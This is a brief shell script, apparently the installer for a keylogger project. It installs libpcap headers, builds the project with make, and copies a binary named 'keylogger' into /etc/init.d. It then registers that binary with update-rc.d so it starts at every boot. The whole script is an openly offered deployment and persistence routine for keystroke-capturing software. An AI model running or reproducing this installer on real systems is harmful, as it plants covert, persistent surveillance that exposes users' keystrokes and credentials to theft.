#!/bin/sh

# Install libpcap-dev if it is already not on the system.
sudo apt-get install libpcap0.8-dev

# Create the binaries.
make -B

chmod +x keylogger
sudo mv keylogger /etc/init.d/
sudo update-rc.d keylogger defaults
